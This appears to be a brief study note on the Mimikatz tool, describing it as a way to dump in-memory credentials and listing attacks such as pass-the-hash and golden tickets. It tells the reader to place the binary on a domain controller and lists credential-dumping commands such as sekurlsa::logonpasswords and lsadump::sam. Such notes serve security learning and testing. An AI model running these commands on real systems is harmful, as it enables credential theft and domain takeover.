## Introduction
- Tool used to view and steal credentials, generate kerberos tickets, and leverage attacks.
- Dumps credentials stored in memory.
- Just a few attacks: Credential dumping, pass-the-hash, over-pass-the-hash, pass-the-ticket, golden ticket, silver ticket.

## Setup for mimikatz
**Put the binary into the domain controller from** --> https://github.com/gentilkiwi/mimikatz/releases
![[mimikatz1.png]]

## Some useful commands:
```python
1. mimikatz.exe
2. privilege::debug
3. sekurlsa::logonpasswords
4. lsadump::sam
5. lsadump::lsa /patch
```
 **For more commands visit the official repo**
 